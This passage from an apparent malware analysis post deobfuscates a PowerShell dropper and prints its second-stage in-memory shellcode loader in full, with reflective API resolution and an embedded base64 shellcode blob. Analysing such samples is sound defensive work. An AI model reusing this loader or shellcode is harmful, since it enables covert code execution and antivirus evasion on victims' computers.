"z824axzhg+3HjEjOUJHi9pAQnYk34S5j6OM{1}H18s7bDPhh1D5s3FJw6VFC7Gsa9k+Fo5Q4PC1YWhb3LWGHlHCxOr379Xa/Ki9aMj3qUUTsapnCcPrhk"</span><span style=color:#d73a49;--shiki-dark:#F97583> +</span><span style=color:#032f62;--shiki-dark:#9ECBFF> "NptSb8rPENJ1mExeqI2HGYhC5rTEnw6bhhBInl4iuwtsEjzPzQSapwmqfzxJilcVAci9v{1}S4lV+BzHoY0cJ8{1}JUq0Lc77DfLH4Q5wX29+kASNr3FADhuMw0nG8IT{1}OGn0rcCi+we4CtHQWk8Bb1GogtglXWKwEKaV14b+YEa/wtgTvrUricyWQGrO4VoewHjroKHRSiveq1QOeci7U4HnkA"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"0D4k6Polh"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"zafJsd4NDTRPnM8xUMPovjMCG57oXQqgsj2NxiY{1}zBsDKJU1xbPCIuVOwoOAnrbzXXLnVBM7OXMDM3Q+IsnvRfUKBiXbpc5nU+97BLAtzLAmtN7JKy4qGoYJfiHJFGKXYF/onVYgE7PUyx{1}zEOMyfHL2rymrBHXSkl1MExsiGyCXgFQa+9dGYfObGqBiO8BvT2Y2BrxYVEwaV0kRx{1}uTsfg1C1S60kqQvjFDLVrgs6tih26gIKElIso{1}SF+Wf1yd1RShmxrYSV5ha1l2gWu3bDIGFxakNYAYGJ"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"HmGbWJQDUhf6xMFSphOv3L16EI6uRSmkD1jaQDhghsOgM06WGBzdE6PW0DFT1xHFaxDKK4dCLQ/qRJElOb0sDzv"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"Vw46WqbDnPQemROS{1}mxBtnYasLpgk{1}lCGOMjArv/nxK8FiHvTjXERHLHMsLmUM{1}4DlUS/VTlLC4xyRGIGaChxuJa"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"sBJ929qVG/NCUSe9k3Au3CB5{1}udFMSTfMmTpyBlRXmX4rk6Hh+yppqx6"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"MM0P2xqwVf{1}1M+gO910dxb+e7SE1UuS9lWltCdp98NgeSYYAe6Q61u52KnO7QUz3YQFJ9W2rNWp7UUrpDXfJl0kKervW1TnumNs+oRB50V"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"Uf96aP9R7typ9P/tpugq9EA+cq1o7SPlVx/xfVnq8thT87HNh9rt4lM{1}NhHVm4108dTM5KmsjLTzEj1Pm49zRw"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"2O4ov"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"wbxKdsPIbMLTbg82gfMwom"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"cPI3BXM2cDgmeqhzMPaQjptwHVl9sukhQb7fEyYG41UYOdtoxGTnbbb34xRwRHIdJkhBQKWblG1rbXbJuSxs8E"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"L9LHTaS"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"rQbf4lbRlf"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"N/70vRAVyW2cy+Dz2CTwNoJrHWPH5yAr0FMVOKCzdiNrsfgrtHabWVv11qRwUfj8tS53n7uuE2T68HbB5/ay1Xb57qerXsIzqQv/bvlVEOF/xrEWyV48M1sO1cjW7rvmVQyrodns8SRB4omIYNc3XS1250nhWBzDcuSs"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"dcbNM/4d9DM5OPB1sjgvTzF9rbpb8CHXl+H830l2xMp9Ui/PwUMlpstsw{1}TbXm/pstjJ/frTAvHaHbWDXufO31DSVv2xF5/uefYESdutrWLiw9A8LlBAvbpeFFxj9uWzvvA+3cVRzNGz3j+Wp8bWXHiWxT4D/2rrENKGCtFRxqHhGuIIr/drHAcYArXAbgwlOmLKA1t3hF564JmvG+RvGMbau7Voa+a8ChYe+qT5dT5+Qx8hILAc7UxxIHH/Hpr96nVggbX2rU6eeK//WTdMMrE3Fidt8gcmtI6za2"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"DQeIKovjb0YKrEIOS/Cper0EHO6+ggEJF31c1DqAUhvQ5fMW5HtnwHD2ArQ1Hn/Nb0J4mYOII3ws"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"Vxu8Iz+8cFSuJfytxiursw4/zL8R5mvuH1TeRqVXfw/PL9MuJ{1}33t"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"9wEw"</span><span style=color:#d73a49;--shiki-dark:#F97583>+</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"tQgDQR2aDMX7i89BHIpceR{1}hCA0kgls8/A/BdcqOruB6mbe5vwFbNEquiwwAAA{0}{0}"</span><span style=color:#24292e;--shiki-dark:#E1E4E8>) </span><span style=color:#d73a49;--shiki-dark:#F97583>-f</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"="</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"Z"</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)))</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>$bytes </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Convert</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::FromBase64String($compressed)</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>$stream </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#005cc5;--shiki-dark:#79B8FF> New-Object</span><span style=color:#24292e;--shiki-dark:#E1E4E8> System.IO.MemoryStream(</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $bytes)</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>$gzip </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#005cc5;--shiki-dark:#79B8FF> New-Object</span><span style=color:#24292e;--shiki-dark:#E1E4E8> System.IO.Compression.GzipStream($stream</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.IO.Compression.CompressionMode</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::Decompress)</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>$reader </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#005cc5;--shiki-dark:#79B8FF> New-Object</span><span style=color:#24292e;--shiki-dark:#E1E4E8> System.IO.StreamReader($gzip)</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>$script </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $reader.ReadToEnd()</span></span>
<span class=line><span style=color:#005cc5;--shiki-dark:#79B8FF>Write-Output</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $script</span></span>
<span class=line></span></code></pre><span class="duration-300 absolute transition-opacity right-3 text-muted-foreground top-3 language select-none text-sm">powershell</span><button class="duration-300 absolute rounded bg-primary-foreground border border-border box-content copy opacity-0 p-1 right-3 text-muted-foreground top-3 transition-opacity" data-code="$compressed = (((&#x22;H4sIAPtILWgCA7VXbW+bSBD+Xqn/AVWWjFXHL6mTpp&#x22; + &#x22;Ei3WJDjGsnJhjc2LVOGBbYeA0EFtuk1/9+sxjyojp3u{1}OKhMzuzszOPvPMzNpNA5uRMBAiSx{1}+vH8nFM/Yiq21IFbuBid1oWL9OUGntafVSnQjn62EC0GcoyjqhWuLBIv&#x22; + &#x22;z824axzhg+3HjEjOUJHi9pAQnYk34S5j6OM{1}H18s7bDPhh1D5s3FJw6VFC7Gsa9k+Fo5Q4PC1YWhb3LWGHlHCxOr379Xa/Ki9aMj3qUUTsapnCcPrhk&#x22; + &#x22;NptSb8rPENJ1mExeqI2HGYhC5rTEnw6bhhBInl4iuwtsEjzPzQSapwmqfzxJilcVAci9v{1}S4lV+BzHoY0cJ8{1}JUq0Lc77DfLH4Q5wX29+kASNr3FADhuMw0nG8IT{1}OGn0rcCi+we4CtHQWk8Bb1GogtglXWKwEKaV14b+YEa/wtgTvrUricyWQGrO4VoewHjroKHRSiveq1QOeci7U4HnkA&#x22;+&#x22;0D4k6Polh&#x22;+&#x22;zafJsd4NDTRPnM8xUMPovjMCG57oXQqgsj2NxiY{1}zBsDKJU1xbPCIuVOwoOAnrbzXXLnVBM7OXMDM3Q+IsnvRfUKBiXbpc5nU+97BLAtzLAmtN7JKy4qGoYJfiHJFGKXYF/onVYgE7PUyx{1}zEOMyfHL2rymrBHXSkl1MExsiGyCXgFQa+9dGYfObGqBiO8BvT2Y2BrxYVEwaV0kRx{1}uTsfg1C1S60kqQvjFDLVrgs6tih26gIKElIso{1}SF+Wf1yd1RShmxrYSV5ha1l2gWu3bDIGFxakNYAYGJ&#x22;+&#x22;HmGbWJQDUhf6xMFSphOv3L16EI6uRSmkD1jaQDhghsOgM06WGBzdE6PW0DFT1xHFaxDKK4dCLQ/qRJElOb0sDzv&#x22;+&#x22;Vw46WqbDnPQemROS{1}mxBtnYasLpgk{1}lCGOMjArv/nxK8FiHvTjXERHLHMsLmUM{1}4DlUS/VTlLC4xyRGIGaChxuJa&#x22;+&#x22;sBJ929qVG/NCUSe9k3Au3CB5{1}udFMSTfMmTpyBlRXmX4rk6Hh+yppqx6&#x22;+&#x22;MM0P2xqwVf{1}1M+gO910dxb+e7SE1UuS9lWltCdp98NgeSYYAe6Q61u52KnO7QUz3YQFJ9W2rNWp7UUrpDXfJl0kKervW1TnumNs+oRB50V&#x22;+&#x22;Uf96aP9R7typ9P/tpugq9EA+cq1o7SPlVx/xfVnq8thT87HNh9rt4lM{1}NhHVm4108dTM5KmsjLTzEj1Pm49zRw&#x22;+&#x22;2O4ov&#x22;+&#x22;wbxKdsPIbMLTbg82gfMwom&#x22;+&#x22;cPI3BXM2cDgmeqhzMPaQjptwHVl9sukhQb7fEyYG41UYOdtoxGTnbbb34xRwRHIdJkhBQKWblG1rbXbJuSxs8E&#x22;+&#x22;L9LHTaS&#x22;+&#x22;rQbf4lbRlf&#x22;+&#x22;N/70vRAVyW2cy+Dz2CTwNoJrHWPH5yAr0FMVOKCzdiNrsfgrtHabWVv11qRwUfj8tS53n7uuE2T68HbB5/ay1Xb57qerXsIzqQv/bvlVEOF/xrEWyV48M1sO1cjW7rvmVQyrodns8SRB4omIYNc3XS1250nhWBzDcuSs&#x22;+&#x22;dcbNM/4d9DM5OPB1sjgvTzF9rbpb8CHXl+H830l2xMp9Ui/PwUMlpstsw{1}TbXm/pstjJ/frTAvHaHbWDXufO31DSVv2xF5/uefYESdutrWLiw9A8LlBAvbpeFFxj9uWzvvA+3cVRzNGz3j+Wp8bWXHiWxT4D/2rrENKGCtFRxqHhGuIIr/drHAcYArXAbgwlOmLKA1t3hF564JmvG+RvGMbau7Voa+a8ChYe+qT5dT5+Qx8hILAc7UxxIHH/Hpr96nVggbX2rU6eeK//WTdMMrE3Fidt8gcmtI6za2&#x22;+&#x22;DQeIKovjb0YKrEIOS/Cper0EHO6+ggEJF31c1DqAUhvQ5fMW5HtnwHD2ArQ1Hn/Nb0J4mYOII3ws&#x22;+&#x22;Vxu8Iz+8cFSuJfytxiursw4/zL8R5mvuH1TeRqVXfw/PL9MuJ{1}33t&#x22;+&#x22;9wEw&#x22;+&#x22;tQgDQR2aDMX7i89BHIpceR{1}hCA0kgls8/A/BdcqOruB6mbe5vwFbNEquiwwAAA{0}{0}&#x22;) -f&#x22;=&#x22;,&#x22;Z&#x22;)))
$bytes = [System.Convert]::FromBase64String($compressed)
$stream = New-Object System.IO.MemoryStream(, $bytes)
$gzip = New-Object System.IO.Compression.GzipStream($stream, [System.IO.Compression.CompressionMode]::Decompress)
$reader = New-Object System.IO.StreamReader($gzip)
$script = $reader.ReadToEnd()
Write-Output $script
" onclick="navigator.clipboard.writeText(this.dataset.code);
          this.classList.add(&#x27;copied&#x27;);
          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)"><div class=ready><svg class=size-5><use href=/icons/code.svg#mingcute-clipboard-line></use></svg></div><div class="hidden success"><svg class=size-5><use href=/icons/code.svg#mingcute-file-check-line></use></svg></div></button></div><p>This ‚Äúmanual method‚Äù reveals the second-stage script, which is then analyzed for its shellcode execution capabilities.</p><h3 id=second-stage-script-in-memory-shellcode-execution>Second-Stage Script: In-Memory Shellcode Execution<a class=anchor href=#second-stage-script-in-memory-shellcode-execution>#</a></h3><p>The deobfuscated second-stage script (<code>payload.ps1</code>) is designed to execute shellcode directly in memory, a common tactic to bypass file-based AV detection.</p><p>Key features of this script:</p><ul><li><strong>Dynamic Function Resolution</strong>: It avoids static analysis of imported functions by dynamically resolving critical Windows API functions (e.g., <code>VirtualAlloc</code>, <code>CreateThread</code>, <code>VirtualProtect</code>, <code>WaitForSingleObject</code>). This is done using reflection and custom functions like <code>paE</code> (likely for <code>GetProcAddress</code> via <code>GetModuleHandle</code>) and <code>vXZ</code> (for creating delegate types on the fly).</li><li><strong>Dynamic Assembly Creation</strong>: The script uses <code>DefineDynamicAssembly</code> and <code>DefineDynamicModule</code> to create .NET assemblies in memory. This allows it to define and use types, such as delegates for P/Invoke calls, without writing to disk.</li><li><strong>Shellcode Handling</strong>: The shellcode is stored as a Base64 encoded string within the script. It‚Äôs decoded and copied into an executable memory region allocated by <code>VirtualAlloc</code>. <code>VirtualProtect</code> might be used to change memory permissions before execution.</li></ul><div class="astro-code astro-code-themes github-dark github-light" style=background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;overflow-x:auto data-language=powershell tabindex=0><pre><code><span class=line><span style=color:#d73a49;--shiki-dark:#F97583>function</span><span style=color:#6f42c1;--shiki-dark:#B392F0> paE</span><span style=color:#24292e;--shiki-dark:#E1E4E8> {</span></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>        Param</span><span style=color:#24292e;--shiki-dark:#E1E4E8> ($jJ5</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $a_TA6)</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        $pRE8k </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> ([</span><span style=color:#d73a49;--shiki-dark:#F97583>AppDomain</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::CurrentDomain.GetAssemblies() </span><span style=color:#d73a49;--shiki-dark:#F97583>|</span><span style=color:#005cc5;--shiki-dark:#79B8FF> Where-Object</span><span style=color:#24292e;--shiki-dark:#E1E4E8> { </span><span style=color:#005cc5;--shiki-dark:#79B8FF>$_</span><span style=color:#24292e;--shiki-dark:#E1E4E8>.GlobalAssemblyCache </span><span style=color:#d73a49;--shiki-dark:#F97583>-And</span><span style=color:#005cc5;--shiki-dark:#79B8FF> $_</span><span style=color:#24292e;--shiki-dark:#E1E4E8>.Location.Split(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'\'</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)[</span><span style=color:#005cc5;--shiki-dark:#79B8FF>-1</span><span style=color:#24292e;--shiki-dark:#E1E4E8>].Equals(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'System.dll'</span><span style=color:#24292e;--shiki-dark:#E1E4E8>) }).GetType(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'Microsoft.Win32.UnsafeNativeMethods'</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)</span></span>
<span class=line></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>        return</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $pRE8k.GetMethod(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'GetProcAddress'</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>Type</span><span style=color:#24292e;--shiki-dark:#E1E4E8>[]]</span><span style=color:#d73a49;--shiki-dark:#F97583>@</span><span style=color:#24292e;--shiki-dark:#E1E4E8>([</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Runtime.InteropServices.HandleRef</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>String</span><span style=color:#24292e;--shiki-dark:#E1E4E8>])).Invoke(</span><span style=color:#005cc5;--shiki-dark:#79B8FF>$null</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#d73a49;--shiki-dark:#F97583> @</span><span style=color:#24292e;--shiki-dark:#E1E4E8>([</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Runtime.InteropServices.HandleRef</span><span style=color:#24292e;--shiki-dark:#E1E4E8>](</span><span style=color:#005cc5;--shiki-dark:#79B8FF>New-Object</span><span style=color:#24292e;--shiki-dark:#E1E4E8> System.Runtime.InteropServices.HandleRef((</span><span style=color:#005cc5;--shiki-dark:#79B8FF>New-Object</span><span style=color:#24292e;--shiki-dark:#E1E4E8> IntPtr)</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> ($pRE8k.GetMethod(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'GetModuleHandle'</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)).Invoke(</span><span style=color:#005cc5;--shiki-dark:#79B8FF>$null</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#d73a49;--shiki-dark:#F97583> @</span><span style=color:#24292e;--shiki-dark:#E1E4E8>($jJ5))))</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $a_TA6))</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>}</span></span>
<span class=line></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>function</span><span style=color:#6f42c1;--shiki-dark:#B392F0> vXZ</span><span style=color:#24292e;--shiki-dark:#E1E4E8> {</span></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>        Param</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>                [</span><span style=color:#005cc5;--shiki-dark:#79B8FF>Parameter</span><span style=color:#24292e;--shiki-dark:#E1E4E8>(</span><span style=color:#e36209;--shiki-dark:#FFAB70>Position</span><span style=color:#d73a49;--shiki-dark:#F97583> =</span><span style=color:#005cc5;--shiki-dark:#79B8FF> 0</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#e36209;--shiki-dark:#FFAB70> Mandatory</span><span style=color:#d73a49;--shiki-dark:#F97583> =</span><span style=color:#005cc5;--shiki-dark:#79B8FF> $True</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)] [</span><span style=color:#d73a49;--shiki-dark:#F97583>Type</span><span style=color:#24292e;--shiki-dark:#E1E4E8>[]] $cpn5o</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>                [</span><span style=color:#005cc5;--shiki-dark:#79B8FF>Parameter</span><span style=color:#24292e;--shiki-dark:#E1E4E8>(</span><span style=color:#e36209;--shiki-dark:#FFAB70>Position</span><span style=color:#d73a49;--shiki-dark:#F97583> =</span><span style=color:#005cc5;--shiki-dark:#79B8FF> 1</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)] [</span><span style=color:#d73a49;--shiki-dark:#F97583>Type</span><span style=color:#24292e;--shiki-dark:#E1E4E8>] $ycb </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>Void</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        )</span></span>
<span class=line></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        $aGf </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>AppDomain</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::CurrentDomain.DefineDynamicAssembly((</span><span style=color:#005cc5;--shiki-dark:#79B8FF>New-Object</span><span style=color:#24292e;--shiki-dark:#E1E4E8> System.Reflection.AssemblyName(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'ReflectedDelegate'</span><span style=color:#24292e;--shiki-dark:#E1E4E8>))</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Reflection.Emit.AssemblyBuilderAccess</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::Run).DefineDynamicModule(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'InMemoryModule'</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF> $false</span><span style=color:#24292e;--shiki-dark:#E1E4E8>).DefineType(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'MyDelegateType'</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#032f62;--shiki-dark:#9ECBFF> 'Class, Public, Sealed, AnsiClass, AutoClass'</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.MulticastDelegate</span><span style=color:#24292e;--shiki-dark:#E1E4E8>])</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        $aGf.DefineConstructor(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'RTSpecialName, HideBySig, Public'</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Reflection.CallingConventions</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::Standard</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $cpn5o).SetImplementationFlags(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'Runtime, Managed'</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        $aGf.DefineMethod(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'Invoke'</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#032f62;--shiki-dark:#9ECBFF> 'Public, HideBySig, NewSlot, Virtual'</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $ycb</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $cpn5o).SetImplementationFlags(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'Runtime, Managed'</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)</span></span>
<span class=line></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>        return</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $aGf.CreateType()</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>}</span></span>
<span class=line></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>[</span><span style=color:#d73a49;--shiki-dark:#F97583>Byte</span><span style=color:#24292e;--shiki-dark:#E1E4E8>[]]$sSYI </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Convert</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::FromBase64String(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcAAAAAEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbrC2zdn/9VIMdJIiflBurfpOP//1U0xwEgx0kiJ+UG6dOw74f/VSIn5SInHQbp1bk1h/9VIgcSgAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q=="</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>[</span><span style=color:#d73a49;--shiki-dark:#F97583>Uint32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]$f21aS </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#005cc5;--shiki-dark:#79B8FF> 0</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>$dQUM </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Runtime.InteropServices.Marshal</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::GetDelegateForFunctionPointer((paE kernel32.dll VirtualAlloc)</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (vXZ </span><span style=color:#d73a49;--shiki-dark:#F97583>@</span><span style=color:#24292e;--shiki-dark:#E1E4E8>([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UInt32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UInt32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UInt32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]) ([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]))).Invoke([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::Zero</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $sSYI.Length</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF>0x3000</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF> 0x04</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)</span></span>
<span class=line></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>[</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Runtime.InteropServices.Marshal</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::Copy($sSYI</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF> 0</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $dQUM</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $sSYI.length)</span></span>
